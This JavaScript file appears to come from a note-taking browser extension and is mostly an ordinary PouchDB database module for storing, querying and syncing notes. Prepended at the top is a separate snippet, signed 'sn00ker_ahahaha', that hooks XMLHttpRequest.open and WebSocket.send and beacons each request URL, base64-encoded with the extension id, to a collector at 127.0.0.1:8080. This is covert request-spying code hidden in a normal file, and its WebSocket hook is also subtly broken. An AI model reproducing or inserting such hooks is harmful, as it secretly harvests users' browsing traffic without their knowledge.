function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/*global PouchDB, emit, purl, _lc_utils */

var _database = {

  // *********** General ***********************************

  // holding user.dbs array of active user
  user_dbIds: [],
  // PouchDB instances of the dbs
  local_dbs: {},

  /**
   * * Error handler for db actions
   * @param err
   * @param executingFunction
   */
  errorHandler: function (err, executingFunction) {
    if (err.status === 409) {
      // conflict err, try again
      console.error('conflict on _database at ' + executingFunction + '\n' + err);
      //_database.onConflictError(err, executingFunction, details)
    } else {
      console.error('Error on _database at ' + executingFunction + '\n' + err);
    }
  },

  /**
   * Helper function for creating new db
   * assumes that as a start, the given user is the only db user and has all permissions
   */
  initDefaultDbMetaObject: function (user, dbId) {
    "use strict";

    return {
      _id: 'meta',
      dbId: dbId,
      dbName: 'General',
      created: Date.now()
    };
  },

  /**
   * we assume user has already been created and set to storage BEFORE calling this.
   * create new local db, init ddocs, meta, update user.dbs obj, create new remote db, sync new local and remote dbs
   *
   * NOTE: on signup, server will automativcally create dbs for user dbs list.
   *
   * @param user
   * @param options - {dMetaData, dbId, isCreateRemote}
   * @returns {*} the new dbId
   */
  createNewDatabase_Promise: function (user, options) {
    "use strict";
    console.log('createNewDatabase_Promise');

    // init options
    var dbId, metaData, isCreateRemote, isCreateMeta, isCreateDdocs;

    if (options && options !== null) {
      dbId = options.dbId ? options.dbId : _lc_utils.createUUID({beginWithLetter: true});
      metaData = options.metaData ? options.metaData : _database.initDefaultDbMetaObject(user, dbId);
      isCreateRemote = options.isCreateRemote !== false; // false if options.isCreateRemote === false. otherwise true.
      isCreateMeta = options.isCreateMeta !== false;
      isCreateDdocs = options.isCreateDdocs !== false;
    }
    else {
      dbId = _lc_utils.createUUID({beginWithLetter: true});
      metaData = _database.initDefaultDbMetaObject(user, dbId);
      isCreateRemote = true;
      isCreateMeta = true;
      isCreateDdocs = true;
    }

    console.log(dbId);
    console.log(options);

    // init db
    var db = _database.getDatabase(dbId);

    var promisesArray = [
      // this will not work on _doUpdateUser because user will be ran over again by _doUpdate
      _storage.updateUserDatabases_Promise(user.localUserId, dbId)
    ];

    if (isCreateMeta) {
      promisesArray.push(db.put(metaData));
    }
    if (isCreateDdocs) {
      promisesArray.push(_database.putDesignDocuments(dbId));
    }
    if (user.isSyncUser && isCreateRemote) {
      promisesArray.push(_remote_database.createRemoteDatabase_Promise(dbId, user));
    }
    return Promise.all(promisesArray).then(function (results) {

      if (user.isSyncUser) {
        return _remote_database.syncDb_Promise(dbId, dbId, null).then(function () {
          return dbId
        })
      } else {
        return dbId
      }
    }).catch(function (err) {
      _database.errorHandler(err, 'createNewDatabase_Promise')
    });
  },

  /**
   * TO BE ADDED
   * @param metaData
   */
  updateDatabaseMetaData: function (metaData) {

  },

  /**
   * Get all the meta data docs from all dbs (for active user)
   * @returns {*}
   */
  getAllDbsMetaData_Promise: function () {
    "use strict";

    var promisesArray = [];
    return _database.getUserDatabases_Promise().then(function (dbs) {

      if (!dbs || dbs === null) {
        // user has no databases, or no active user
        return [];
      } else {
        Object.keys(dbs).forEach(function (dbId) {
          promisesArray.push(dbs[dbId].get('meta'))
        });
        return Promise.all(promisesArray)
      }

    }).catch(function (err) {
      _database.errorHandler(err, 'getAllDbsMetaData_Promise')
    })
  },

  /**
   * will be called on each tab refresh and re-init the dbs objects.
   * @returns the instances of the local pouch dbs
   */
  getUserDatabases_Promise: function () {
    "use strict";
    return _storage.getActiveUser_Promise().then(function (user) {

      if (!user || user === null) {
        //no active user found
        _database.user_dbIds = [];
        _database.local_dbs = {};
      }
      else {
        _database.user_dbIds = user.dbs;

        // clean local_dbs
        _database.local_dbs = {};

        // set user's local dbs
        for (var i = 0; i < user.dbs.length; i++) {
          var dbId = user.dbs[i];
          _database.getDatabase(dbId);
        }

        return _database.local_dbs;
      }
    })
  },

  /**
   * Lazy getter for database instance
   * @return {object} database
   */
  getDatabase: function (database_id) {
    "use strict";
    var dbId = database_id;

    if (!dbId || dbId === null) {
      _database.errorHandler('dbId has to be provided ', 'getDatabase')
    }

    if (!_database.local_dbs[dbId]) {
      _database.local_dbs[dbId] = new PouchDB(dbId);
    }
    if (_database.user_dbIds.indexOf(dbId) === -1) {
      _database.user_dbIds.push(dbId);
    }
    return _database.local_dbs[dbId]
  },

  /**
   * Put the standard design documents in a db
   *
   * @param dbId
   */
  putDesignDocuments: function (dbId) {
    "use strict";
    console.log('putting _design documents to db ' + dbId);

    var db = _database.getDatabase(dbId);

    return db.bulkDocs([
      {
        _id: '_design/domain_view',
        views: {
          'domain_view': {
            map: function (doc) {
              emit([doc.domain, doc.modified]);
            }.toString()
          }
        }
      },
      {
        _id: '_design/url_view',
        views: {
          'url_view': {
            map: function (doc) {
              emit([doc.url, doc.modified]);
            }.toString()
          }
        }
      },
      {
        _id: '_design/dbId_view',
        views: {
          'dbId_view': {
            map: function (doc) {
              emit([doc.dbId]);
            }.toString()
          }
        }
      },
      {
        _id: '_design/sum_view',
        views: {
          'sum_view': {
            map: function (doc) {
              // the values will be reduced with '_sum'. If that == 0, number of create == delete
              switch (doc.verb) {
                case 'create':
                  emit(doc.match, 1);
                  break;
                case 'update':
                  emit(doc.match, 1);
                  break;
                case 'delete':
                  emit(doc.match, -1);
                  break;
              }
            }.toString(),
            reduce: "_sum"
          }
        }
      }
    ])
  },

  // *********** Documents ***********************************

  /**
   * create a new note in the database
   * @param noteData is note properties
   * @returns {*|HttpPromise}
   */
  createDocument_Promise: function (noteData) {
    "use strict";
    return _database.getDatabase(noteData.dbId).put(noteData).then(function (result) {
      console.log('success createNote_Promise to db ' + noteData.dbId);
      return result
    }).catch(function (err) {
      _database.errorHandler(err, 'createDocument_Promise');
    })
  },

  /**
   * before updating, change relevant fields
   * @param noteData
   * @returns {*|i|f}
   */
  setUpdatedNoteProperties_Promise: function (noteData) {
    "use strict";
    var now = new Date().getTime();
    return new Promise(function (resolve, reject) {
      noteData.verb = 'update';
      noteData.modified = now;
      if (noteData.verb == 'update' && noteData.modified == now) {
        resolve(noteData)
      }
      else {
        reject(Error('Error on setUpdatedNoteProperties_Promise'))
      }
    });
  },

  /**
   * update note in the database
   * @param noteData is note properties
   * @returns {*|HttpPromise}
   */
  updateDocument_Promise: function (noteData) {
    'use strict';
    return _database.setUpdatedNoteProperties_Promise(noteData).then(function (noteData) {
      return _database.getDatabase(noteData.dbId).put(noteData)
    }).then(function (result) {
      console.log('success updateDocument_Promise ' + noteData._id + 'to db ' + noteData.dbId);
      noteData._rev = result.rev;
      return(noteData);
    }).catch(function (err) {
      if (err.status === 409) {
        console.log('conflict updating note. trying again.');
        return _database.getDatabase(noteData.dbId).get(noteData._id).then(function (origDoc) {
          noteData._rev = origDoc._rev;
          return _database.updateDocument_Promise(noteData);
        })
      } else {
        _database.errorHandler(err, 'updateDocument_Promise');
      }
    })
  },

  ///**
  // * Get document (of any verb). Always latest revision
  // * @param {string} documentId
  // * @param {function} callback (err, doc)
  // */
  //getDocument_Promise: function (documentId) {
  //  // NOTE getDatabase here does not have a dbId
  //  return _database.getDatabase().get(documentId);
  //},

  /**
   * getting all documents with key=value
   *
   * NOTE: Only keys added in design documents are supported! {domain, url, dbId}
   *
   * eg - dbId= 'pdb_123456', key='domain', value='www.cliptoapp.com', descending=true
   * @param dbId
   * @param key
   * @param value
   * @param descending
   * @returns {*}
   */
  getDocumentsByKey_Promise: function (dbId, key, value, descending) {
    console.log('getting documents for ' + key + ' = ' + value);

    var _descending = descending || false;
    var options = {
      "startkey": !_descending ? [value] : [value, {}],
      "endkey": !_descending ? [value, {}] : [value],
      "descending": _descending,
      "include_docs": true
    };
    // add '_modified_view' because that's how we called and designed our ddocs
    var ddoc_query = key + '_view';

    return _database.getDatabase(dbId).query(ddoc_query, options).then(function (result) {
      return result.rows.map(function (row) {
        return row.doc;
      });
    }).catch(function (err) {
      _database.errorHandler(err, 'getDocumentsByKey_Promise');
    })
  },

  /**
   * getting all documents from all dbs, matching the key=value pair.
   * this way we can, for example, get all domain notes from all different dbs.
   *
   * @param key
   * @param value
   * @param descending
   * @returns {*|{options}}
   */
  getAllDocumentsByKey_Promise: function (key, value, descending) {
    "use strict";
    var promisesArray = [],
      allNotes = [];

    return _database.getUserDatabases_Promise().then(function (dbs) {

      Object.keys(dbs).forEach(function (dbId) {
        promisesArray.push(_database.getDocumentsByKey_Promise(dbId, key, value, descending))
      });
      return Promise.all(promisesArray)

    }).then(function (results) {
      for (var i = 0; i < results.length; i++) {
        allNotes = allNotes.concat(results[i]);
      }

      return allNotes;
    })
  },

  /**
   ***** not including user and design docs!! Notes only ****
   * Get ALL the NOTE documents
   */
  getDocumentsByDb_Promise: function (dbId) {
    var options = {
      startkey: '2015-12-31T22:00:00.000Z', //date of 01-01-2016
      endkey: '2119-12-31T22:00:00.000Z',   //date of 01-01-2120
      include_docs: true
    };
    return _database.getDatabase(dbId).allDocs(options).then(function (result) {
      return result.rows.map(function (row) {
        return row.doc;
      });
    }).catch(function (err) {
      _database.errorHandler(err, 'getDocumentsByDb_Promise');
    })
  },

  /**
   * gets all the docs from all og the user's dbs.
   * not including users and ddocs
   * @returns {*|{options}}
   */
  getAllDocuments_Promise: function () {
    "use strict";

    var promisesArray = [],
      allNotes = [];

    return _database.getUserDatabases_Promise().then(function (dbs) {

      Object.keys(dbs).forEach(function (dbId) {
        promisesArray.push(_database.getDocumentsByDb_Promise(dbId))
      });
      return Promise.all(promisesArray)

    }).then(function (results) {
      for (var i = 0; i < results.length; i++) {
        allNotes = allNotes.concat(results[i]);
      }

      return allNotes;

    })
  },

  /**
   * change the value of the 'key' for all documents with oldDbId to newDbId
   * @param documents - the documents to update (Array of objects)
   * @param key - key storing the value to change (string)
   * @param oldVal
   * @param newVal
   */
  updateDocumentsByKey_Promise: function (documents, key, oldVal, newVal) {
    "use strict";
    console.log('updateDocumentsByKey_Promise');
    var promisesArray = [];

    documents.forEach(function (doc, index) {
      if (doc[key] = oldVal) {
        doc[key] = newVal;
        promisesArray[index] = _database.updateDocument_Promise(doc)
      }
    });
    return Promise.all(promisesArray)
  },

  /**
   * Delete a specific document (any verb).
   * This is usually only called after a postDeleteDocument(), when the check for stale documents finds something,
   * or from event page's createHighlight(), when something went wrong inserting it in the DOM
   * @param noteData note_properties, including {_id, _rev}
   * @param {object} [callback] *seems to be required*
   */
  removeDocument_Promise: function (noteData) {
    "use strict";
    return _database.getDatabase(noteData.dbId).remove(noteData).then(function (result) {
      console.log('success removeDocument_Promise to db ' + noteData.dbId);
    }).catch(function (err) {
      if (err.status === 409) {
        console.log('conflict delete note. trying again.');
        return _database.getDatabase(noteData.dbId).get(noteData._id).then(function (origDoc) {
          noteData._rev = origDoc._rev;
          return _database.removeDocument_Promise(noteData)
        })
      } else {
        _database.errorHandler(err, 'removeDocument_Promise');
      }
    })
  },

  /**
   * Delete all documents associated with key and value (any verb).
   * Usually called via a 'remove all' button
   * @param dbId
   * @param key (eg 'domain')
   * @param value (eg www.google.com)
   * @returns {*}
   */
  removeDocumentsByKey_Promise: function (dbId, key, value) {
    "use strict";
    // promise version
    return _database.getDocumentsByKey_Promise(dbId, key, value).then(function (docs) {
      docs.forEach(function (doc) {
        doc._deleted = true;
      });

      return _database.getDatabase(dbId).bulkDocs(docs);
    })
  },

  // =============== GENERAL ===============================

  /**
   * map-reduce on a view of all documents associated with a key of 'match'.
   * The reduce is on the sum of the value of the document, where a 'create' verb is +1 and 'delete' -1.
   * if the sum is zero we can safely remove all documents with this key.
   * if it's < 0 somethings wrong.
   * @param {string} dbId
   * @param {string} match
   * @param {function} [callback] function(err, sum)
   */
  getMatchSum_Promise: function (dbId, match) {
    "use strict";
    return _database.getDatabase(dbId).query('sum_view', {
      key: match
    }).then(function (result) {
      var sum = (result.rows.length === 0 ? 0 : result.rows[0].value);

      if (sum < 0) {
        console.log("WARNING: create/delete sum < 0");
      }

      return sum;
    });
  },


  /**
   * Get an array of unique matches, and the number of documents (accounting for 'delete' documents)
   * If the value is zero, all documents with its match (key) can be removed
   * @param {function} callback function(err, rows): rows = [{key: match, value: count}]
   */
  getMatchSums_Promise: function (dbId) {
    "use strict";
    return _database.getDatabase(dbId).query("sum_view", {
      group: true,
      group_level: 1,
      include_docs: false
    }).then(function (result) {
      return result.rows;
    });
  },

  /**
   * As design docs are deleted or modified, their associated index files (in CouchDB) or
   * companion databases (in local PouchDBs) continue to take up space on disk.
   * viewCleanup() removes these unnecessary index files.
   * @param {function} [callback] function(result): { ok: "true" }
   */
  viewCleanup_Promise: function (dbId) {
    "use strict";
    //console.log('viewCleanup_Promise');
    return _database.getDatabase(dbId).viewCleanup();
  },

  /**
   * Runs compaction of the database. Fires callback when compaction is done.
   */
  compact: function (dbId) {
    "use strict";
    console.log('compacting db ' + dbId);
    return _database.getDatabase(dbId).compact();
  },

  /**
   * Dump database to a stream
   * @param {Object} stream - stream to dump to
   * @returns - {Promise}
   */
  dump: function (dbId, stream) {
    return _database.getDatabase(dbId).dump(stream, {
      filter: function (doc) {
        // don't include internal documents
        // return doc._id.match(/^_/) === null;
        return doc._id.match(/^_design\//) === null;
      }
    });
  },

  /**
   *
   * @param existingUser
   * @param newUserData
   * @returns {*}
   */
  //updateUserDatabases: function (existingUser, newUserData) {
  //
  //    console.log('updating user databases');
  //
  //    // currently just updating pdb
  //    var exist_pdb = _lc_utils.findObjectInArrayOfObjects(existingUser.dbs, 'dbId', 'pdb_');
  //    var new_pdb = _lc_utils.findObjectInArrayOfObjects(newUserData.dbs, 'dbId', 'pdb_');
  //
  //    // first check if private dbId is the same
  //    if (exist_pdb.dbId == new_pdb.dbId) {
  //        // same, do nothing
  //    } else {
  //        // not the same, means user just signed up / logged in and _id !== localUserId
  //        // replicate local private db to align with db name on server
  //        //TODO: change dbId and db_owner on user object in _storage too
  //        return _database.replicateDatabase_Promise(exist_pdb.dbId, new_pdb.dbId).then(function () {
  //            //get all the docs from the old db
  //            return _database.getDocumentsByDb_Promise(exist_pdb.dbId)
  //        }).then(function (docs) {
  //            // update the documents correspondingly
  //            return _database.updateDocumentsByKey_Promise(docs, 'dbId', exist_pdb.dbId, new_pdb.dbId)
  //        })
  //            .then(function () {
  //                //delete old private local db
  //                _database.destroy(exist_pdb.dbId);
  //            })
  //    }
  //},

  /**
   * replicate db
   * @param dbFrom
   * @param dbTo
   * @returns {*}
   */
  replicateDatabase_Promise: function (dbFrom, dbTo) {

    console.log('replicating database ' + dbFrom + ' +to ' + dbTo);

    var db_from = _database.getDatabase(dbFrom);
    var db_to = _database.getDatabase(dbTo);

    return new Promise(function (resolve, reject) {
      db_from.replicate.to(db_to).on('complete', function () {
        resolve(dbTo);
      }).on('error', function (err) {
        _database.errorHandler(err, 'replicateDatabase_Promise');
        reject();
      });
    })

  },

  /**
   * destroy db
   * @returns {*}
   */
  destroy: function (dbId) {
    "use strict";
    console.log('destroying database ' + dbId);

    return _database.getDatabase(dbId).destroy().then(function () {
      _database.local_dbs[dbId] = null;
    });
  },

  /**
   * destroys all active user databases
   */
  destroyAll: function () {

    console.log('destroying all dbs');
    for (var i = 0; i < _database.user_dbIds; i++) {
      var dbId = _database.user_dbIds[i];
      _database.destroy(dbId);
    }
  },

  /**
   * Load database from url or string
   * @param {String} urlOrString - source
   * @returns - {Promise}
   */
  load: function (dbId, urlOrString) {
    console.log('load');
    // attempt to load database into a temporary db (not in-memory, though)
    var tmpdb = new PouchDB("_tmpdb");

    return tmpdb.load(urlOrString).then(function () {
      // safe to destroy existing database
      return _database.destroy();
    }).then(function () {
      // replicate loaded database. Design docs were filtered out
      return PouchDB.replicate(tmpdb, _database.getDatabase(dbId));
    }).then(function () {
      // add design docs
      return _database.putDesignDocuments();
    }).then(function () {
      // cleanup
      return tmpdb.destroy();
    }).catch(function (err) {
      // cleanup
      tmpdb.destroy();

      // let caller handle error
      throw err;
    });
  }

};

